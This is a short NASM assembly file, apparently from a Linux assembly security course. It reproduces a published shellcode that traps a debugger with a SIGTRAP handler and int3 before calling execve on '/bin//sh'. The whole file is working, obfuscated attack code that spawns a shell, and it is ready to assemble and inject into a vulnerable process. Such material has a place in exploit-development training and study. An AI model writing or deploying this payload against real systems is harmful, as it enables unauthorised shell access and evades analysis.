; Filename: 230-nasm.nasm
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
; Desc:  nasm file of http://shell-storm.org/shellcode/files/shellcode-230.php 
; Purpose: SLAE

global _start

section .text
_start:

	 push byte 0x30
 	 pop eax
	 push byte 0x5
	 pop ebx
	 jmp short locker

	evil_lock:
	 pop ecx
	 int 0x80	
	 int3
	 inc eax
	 locker:
	 call evil_lock
	 cdq

	evilcode:
	 mov al,0xb
	 push edx
	 push dword 0x68732f2f
	 push dword 0x6e69622f
	 mov ebx,esp
	 push edx
	 push ebx
	 push esp
	 jmp short evil_lock
